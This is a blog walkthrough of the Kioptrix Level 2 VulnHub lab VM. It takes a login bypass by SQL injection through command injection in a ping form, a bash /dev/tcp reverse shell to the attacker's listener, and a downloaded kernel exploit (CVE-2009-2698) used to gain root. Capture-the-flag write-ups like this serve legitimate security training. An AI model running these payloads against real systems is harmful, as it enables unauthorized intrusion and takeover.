<i>Kioptrix 2 VM can be downloaded <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">here</a>.</i><br /><h2>0. Get VMs IP</h2><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~#</span> netdiscover -r 192.168.1.0/24<br /><br /><span style="color: #aaaaaa;"> Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    </span><br /><span style="color: #aaaaaa;">                                                                                                                                                                                                                  </span><br /><span style="color: #aaaaaa;"> 260 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 15600                                                                                                                                              </span><br /><span style="color: #aaaaaa;"> _____________________________________________________________________________</span><br /><span style="color: #aaaaaa;">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br /><span style="color: #aaaaaa;"> -----------------------------------------------------------------------------</span><br /><span style="color: #aaaaaa;"> 192.168.1.67    c4:e9:84:10:d3:5e    255   15300  TP-LINK TECHNOLOGIES CO.,LTD.                                                                                                                                  </span><br /><span style="color: #aaaaaa;"> <b>...</b></span><br /></pre></div><br /><h2>1. Enumeration&nbsp;</h2><h4>1.1 TCP Ports enumeration</h4><!-- HTML generated using hilite.me --><br /><div style="background: #f0f3f3; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #000099; font-weight: bold;">root@kali:~#</span> nmap 192.168.1.67 -sV<br /><br /><span style="color: #aaaaaa;">Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-15 00:30 EST</span><br /><span style="color: #aaaaaa;">Nmap scan report for 192.168.1.67</span><br /><span style="color: #aaaaaa;">Host is up (0.000049s latency).</span><br /><span style="color: #aaaaaa;">Not shown: 994 closed ports</span><br /><span style="color: #aaaaaa;">PORT     STATE SERVICE  VERSION</span><br /><span style="color: #aaaaaa;">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br /><span style="color: #aaaaaa;">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br /><span style="color: #aaaaaa;">111/tcp  open  rpcbind  2 (RPC #100000)</span><br /><span style="color: #aaaaaa;">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br /><span style="color: #aaaaaa;">631/tcp  open  ipp      CUPS 1.1</span><br /><span style="color: #aaaaaa;">3306/tcp open  mysql    MySQL (unauthorized)</span><br /><span style="color: #aaaaaa;">MAC Address: C4:E9:84:10:D3:5E (Tp-link Technologies)</span><br /><br /><span style="color: #aaaaaa;">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br /><span style="color: #aaaaaa;">Nmap done: 1 IP address (1 host up) scanned in 16.64 seconds</span><br /></pre></div><br />Hmm, some interesting services we see running on the machine. Most of these are pretty old. I did a quick search for existing exploits and didn't find any. It's still very possible that other vulnerabilities exist, yet I decided to check the web server running first.<br /><br />Note: I didn't do a full TCP scan as it was taking way too long. Running it in the background after the initial scan is might be useful.<br /><br /><h2>2. Web server</h2><h4>2.1 Login form </h4><table align="center" border="1" cellpadding="2" cellspacing="2" style="width: 300px;">  <tbody><tr>   <td align="center" colspan="2"><b>Remote System Administration Login</b>   </td>  </tr><tr>   <td width="150">Username</td>   <td><input name="uname" type="text" /></td>  </tr><tr>   <td width="150">Password</td>   <td><input name="psw" type="password" />   </td>  </tr><tr>   <td align="center" colspan="2"><input name="btnLogin" type="submit" value="Login" />   </td>  </tr></tbody></table><br />Hitting http://192.168.1.67 shows us a login form, possibly vulnerable to SQL injection. I tried the vanilla <b>admin' or 1=1 #</b> and it worked!<br /><br />Why did it work? Possibly because the query is in this form:<br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #204a87; font-weight: bold;">SELECT</span> <span style="color: #ce5c00; font-weight: bold;">*</span> <span style="color: #204a87; font-weight: bold;">from</span> <span style="color: black;">users</span> <span style="color: #204a87; font-weight: bold;">where</span> <span style="color: black;">username</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #4e9a06;">"$_REQUEST["</span><span style="color: black;">username</span><span style="color: #4e9a06;">"]"</span> <span style="color: #204a87; font-weight: bold;">and</span> <span style="color: black;">password</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #4e9a06;">"$_REQUEST["</span><span style="color: black;">password</span><span style="color: #4e9a06;">"]"</span><br /></pre></div><br />After submitting <b>admin" or 1=1 #</b>, it's evaluated to:<br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #204a87; font-weight: bold;">SELECT</span> <span style="color: #ce5c00; font-weight: bold;">*</span> <span style="color: #204a87; font-weight: bold;">from</span> <span style="color: black;">users</span> <span style="color: #204a87; font-weight: bold;">where</span> <span style="color: black;">username</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #4e9a06;">"admin"</span> <span style="color: #204a87; font-weight: bold;">or</span> <span style="color: #0000cf; font-weight: bold;">1</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">1</span> <span style="color: #ce5c00; font-weight: bold;">#</span><span style="color: #999999;"> <i>" and password="$_REQUEST["password"]"</i></span><br /></pre></div><br />which logs us in as admin.<br /><br /><h4>2.2 Admin interface&nbsp;</h4><h4>&nbsp;</h4><h4><form action="pingit.php" method="post" name="ping" target="_blank"><table border="1" style="width: 600px;">  <tbody><tr valign="middle">   <td align="center" colspan="2"><b>Welcome to the Basic Administrative Web Console</b>   </td>  </tr><tr valign="middle">   <td align="center">Ping a Machine on the Network:    </td>    <td align="center"><input name="ip" size="30" type="text" />    <input name="submit" type="submit" value="submit" />   </td>   </tr></tbody></table></form></h4><br /><span style="font-weight: normal;">This looks very vulnerable to an RCE (Remote Code Injection) attack. Let's try appending commands to it.</span><br /><br /><ul><li><span style="font-weight: normal;"><b>Input:</b>&nbsp; 127.0.0.1</span> <span style="font-weight: normal;"><b>&nbsp;</b></span><br /><span style="font-weight: normal;"><b>Output:</b>&nbsp;</span><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"> <span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span><br /><br /><span style="color: black;">PING</span> <span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span> <span style="color: black; font-weight: bold;">(</span><span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">)</span> <span style="color: #0000cf; font-weight: bold;">56</span><span style="color: black; font-weight: bold;">(</span><span style="color: #0000cf; font-weight: bold;">84</span><span style="color: black; font-weight: bold;">)</span> <span style="color: black;">bytes</span> <span style="color: #204a87; font-weight: bold;">of</span> <span style="color: #204a87; font-weight: bold;">data</span><span style="color: black; font-weight: bold;">.</span><br /><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">bytes</span> <span style="color: #204a87; font-weight: bold;">from</span> <span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">:</span> <span style="color: black;">icmp_seq</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">0</span> <span style="color: black;">ttl</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">time</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">010</span> <span style="color: black;">ms</span><br /><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">bytes</span> <span style="color: #204a87; font-weight: bold;">from</span> <span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">:</span> <span style="color: black;">icmp_seq</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">1</span> <span style="color: black;">ttl</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">time</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">012</span> <span style="color: black;">ms</span><br /><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">bytes</span> <span style="color: #204a87; font-weight: bold;">from</span> <span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">:</span> <span style="color: black;">icmp_seq</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">2</span> <span style="color: black;">ttl</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">time</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">012</span> <span style="color: black;">ms</span><br /><br /><span style="color: #8f5902; font-style: italic;">--- 127.0.0.1 ping statistics ---</span><br /><span style="color: #0000cf; font-weight: bold;">3</span> <span style="color: black;">packets</span> <span style="color: black;">transmitted</span><span style="color: black; font-weight: bold;">,</span> <span style="color: #0000cf; font-weight: bold;">3</span> <span style="color: black;">received</span><span style="color: black; font-weight: bold;">,</span> <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: #ce5c00; font-weight: bold;">%</span> <span style="color: black;">packet</span> <span style="color: black;">loss</span><span style="color: black; font-weight: bold;">,</span> <span style="color: black;">time</span> <span style="color: #0000cf; font-weight: bold;">1998</span><span style="color: black;">ms</span><br /><span style="color: black;">rtt</span> <span style="color: #204a87; font-weight: bold;">min</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: #204a87; font-weight: bold;">avg</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: #204a87; font-weight: bold;">max</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: black;">mdev</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">010</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">011</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">012</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">003</span> <span style="color: black;">ms</span><span style="color: black; font-weight: bold;">,</span> <span style="color: black;">pipe</span> <span style="color: #0000cf; font-weight: bold;">2</span><br /></pre></div></li></ul><br /><ul><li><span style="font-weight: normal;"><b>Input:</b>&nbsp; 127.0.0.1; whoami</span><span style="font-weight: normal;"><b>&nbsp;</b></span><br /><span style="font-weight: normal;"><b>Output:</b>&nbsp;</span><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">;</span> <span style="color: black;">whoami</span><br /><br /><span style="color: black;">PING</span> <span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span> <span style="color: black; font-weight: bold;">(</span><span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">)</span> <span style="color: #0000cf; font-weight: bold;">56</span><span style="color: black; font-weight: bold;">(</span><span style="color: #0000cf; font-weight: bold;">84</span><span style="color: black; font-weight: bold;">)</span> <span style="color: black;">bytes</span> <span style="color: #204a87; font-weight: bold;">of</span> <span style="color: #204a87; font-weight: bold;">data</span><span style="color: black; font-weight: bold;">.</span><br /><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">bytes</span> <span style="color: #204a87; font-weight: bold;">from</span> <span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">:</span> <span style="color: black;">icmp_seq</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">0</span> <span style="color: black;">ttl</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">time</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">007</span> <span style="color: black;">ms</span><br /><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">bytes</span> <span style="color: #204a87; font-weight: bold;">from</span> <span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">:</span> <span style="color: black;">icmp_seq</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">1</span> <span style="color: black;">ttl</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">time</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">012</span> <span style="color: black;">ms</span><br /><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">bytes</span> <span style="color: #204a87; font-weight: bold;">from</span> <span style="color: #0000cf; font-weight: bold;">127</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">1</span><span style="color: black; font-weight: bold;">:</span> <span style="color: black;">icmp_seq</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">2</span> <span style="color: black;">ttl</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">64</span> <span style="color: black;">time</span><span style="color: #ce5c00; font-weight: bold;">=</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">013</span> <span style="color: black;">ms</span><br /><br /><span style="color: #8f5902; font-style: italic;">--- 127.0.0.1 ping statistics ---</span><br /><span style="color: #0000cf; font-weight: bold;">3</span> <span style="color: black;">packets</span> <span style="color: black;">transmitted</span><span style="color: black; font-weight: bold;">,</span> <span style="color: #0000cf; font-weight: bold;">3</span> <span style="color: black;">received</span><span style="color: black; font-weight: bold;">,</span> <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: #ce5c00; font-weight: bold;">%</span> <span style="color: black;">packet</span> <span style="color: black;">loss</span><span style="color: black; font-weight: bold;">,</span> <span style="color: black;">time</span> <span style="color: #0000cf; font-weight: bold;">1999</span><span style="color: black;">ms</span><br /><span style="color: black;">rtt</span> <span style="color: #204a87; font-weight: bold;">min</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: #204a87; font-weight: bold;">avg</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: #204a87; font-weight: bold;">max</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: black;">mdev</span> <span style="color: #ce5c00; font-weight: bold;">=</span> <span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">007</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">010</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">013</span><span style="color: #ce5c00; font-weight: bold;">/</span><span style="color: #0000cf; font-weight: bold;">0</span><span style="color: black; font-weight: bold;">.</span><span style="color: #0000cf; font-weight: bold;">004</span> <span style="color: black;">ms</span><span style="color: black; font-weight: bold;">,</span> <span style="color: black;">pipe</span> <span style="color: #0000cf; font-weight: bold;">2</span><br /><span style="color: red;"><b><span style="color: black;">apache</span></b></span><br /></pre></div></li></ul><br /><b>whoami </b>command<b> </b>returned apache! We're able to execute arbitrary commands. Let's get a shell by starting a listener on attacking machine.<br /><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~#</span> nc -nvlp 443<br /><span style="color: black; font-style: italic;">listening on [any] 443 ...</span><br /></pre></div><br />Then getting a reverse shell connected to it.<br /><br /><b>Input:</b> 127.0.0.1; bash -i &gt;&amp; /dev/tcp/192.168.1.69/443 0&gt;&amp;1<br /><b>Output on attacking machine:</b><br /><!-- HTML generated using hilite.me --><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">root@kali:~#</span> nc -nvlp 443<br /><span style="color: black; font-style: italic;">listening on [any] 443 ...</span><br /><span style="color: black; font-style: italic;">connect to [192.168.1.69] from (UNKNOWN) [192.168.1.67] 32769</span><br /><span style="color: black; font-style: italic;">bash: no job control in this shell</span><br /><span style="color: black; font-style: italic;">bash-3.00$ </span><br /></pre></div><br />Awesome! We got a shell as apache user.<br /><br /><h2>3. Getting root</h2>Basic enumeration will reveal that this CentOS version <b>(4.5 Final) </b>is vulnerable to&nbsp;                                    <a class="external" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2698" rel="nofollow" target="_blank">                                        CVE-2009-2698&nbsp;</a><br />Exploit can be found <a href="https://www.exploit-db.com/exploits/9542/">here</a>. <br /><br /><!-- HTML generated using hilite.me --> <br /><div style="background: #f0f0f0; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">root@kali:~#</span> nc -nvlp 443<br /><span style="color: #888888;">listening on [any] 443 ...</span><br /><span style="color: #888888;">connect to [192.168.1.69] from (UNKNOWN) [192.168.1.67] 32769</span><br /><span style="color: #888888;">bash: no job control in this shell</span><br /><span style="color: #888888;"><span style="color: #c65d09; font-weight: bold;">bash-3.00$</span> cat /etc/issue</span><br /><span style="color: #888888;">Welcome to Kioptrix Level 2 Penetration and Assessment Environment</span><br /><span style="color: #888888;">--The object of this game:</span><br /><span style="color: #888888;">|_Acquire "root" access to this machine.</span><br /><span style="color: #888888;">There are many ways this can be done, try and find more then one way to</span><br /><span style="color: #888888;">appreciate this exercise.</span><br /><span style="color: #888888;">DISCLAIMER: Kioptrix is not resposible for any damage or instability</span><br /><span style="color: #888888;">caused by running, installing or using this VM image.</span><br /><span style="color: #888888;">Use at your own risk.</span><br /><span style="color: #888888;">WARNING: This is a vulnerable system, DO NOT run this OS in a production</span><br /><span style="color: #888888;">environment. Nor should you give this system access to the outside world</span><br /><span style="color: #888888;">(the Internet - or Interwebs..)</span><br /><br /><span style="color: #888888;">Good luck and have fun!</span><br /><span style="color: #888888;"><span style="color: #c65d09; font-weight: bold;">bash-3.00$</span> uname -a</span><br /><span style="color: #888888;">Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span><br /><span style="color: #888888;"><span style="color: #c65d09; font-weight: bold;">bash-3.00$</span> uname -mrs</span><br /><span style="color: #888888;">Linux 2.6.9-55.EL i686</span><br /><span style="color: #888888;"><span style="color: #c65d09; font-weight: bold;">bash-3.00$</span> cat /etc/redhat-release</span><br /><span style="color: #888888;">CentOS release 4.5 (Final)</span><br /><span style="color: #888888;"><span style="color: #c65d09; font-weight: bold;">bash-3.00$</span> cd /tmp</span><br /><span style="color: #888888;"><span style="color: #c65d09; font-weight: bold;">bash-3.00$</span> wget https://www.exploit-db.com/download/9542 --no-check-certificate</span><br /><span style="color: #888888;">--23:08:44--  https://www.exploit-db.com/download/9542</span><br /><span style="color: #888888;">           =&gt; `9542'</span><br /><span style="color: #888888;">Resolving www.exploit-db.com... 192.124.249.8</span><br /><span style="color: #888888;">Connecting to www.exploit-db.com|192.124.249.8|:443... connected.</span><br /><span style="color: #888888;">WARNING: Certificate verification error for www.exploit-db.com: unable to get local issuer certificate</span><br /><span style="color: #888888;">WARNING: certificate common name `*.sucuri.net' doesn't match requested host name `www.exploit-db.com'.</span><br /><span style="color: #888888;">HTTP request sent, awaiting response... 200 OK</span><br /><span style="color: #888888;">Length: 2,645 (2.6K) [application/txt]</span><br /><br /><span style="color: #888888;">    0K ..                                                    100%  210.21 MB/s</span><br /><br /><span style="color: #888888;">23:08:45 (210.21 MB/s) - `9542' saved [2645/2645]</span><br /><br /><span style="color: #888888;"><span style="color: #c65d09; font-weight: bold;">bash-3.00$</span> ls</span><br /><span style="color: #888888;">9542</span><br /><span style="color: #888888;">index.html</span><br /><span style="color: #888888;"><span style="color: #c65d09; font-weight: bold;">bash-3.00$</span> mv 9542 a.c</span><br /><span style="color: #888888;"><span style="color: #c65d09; font-weight: bold;">bash-3.00$</span> gcc a.c</span><br /><span style="color: #888888;"><span style="color: #c65d09; font-weight: bold;">bash-3.00$</span> ./a.out</span><br /><span style="color: #888888;">sh: no job control in this shell</span><br /><span style="color: #c65d09; font-weight: bold;">sh-3.00#</span> <br /></pre></div><br />Quite easy and straight forward! <strike>Gonna write Kioptrix 3 soon.. </strike>Kioptrix 3 writeup can be read <a href="http://www.abatchy.com/2016/12/kioptrix-3-walkthrough-vulnhub.html">here</a>.<br /><br /><i>Currently listening to: <a href="https://www.youtube.com/watch?v=pDnMUyLYJDo">Altar Of Plagues - Earth: As A Womb</a></i>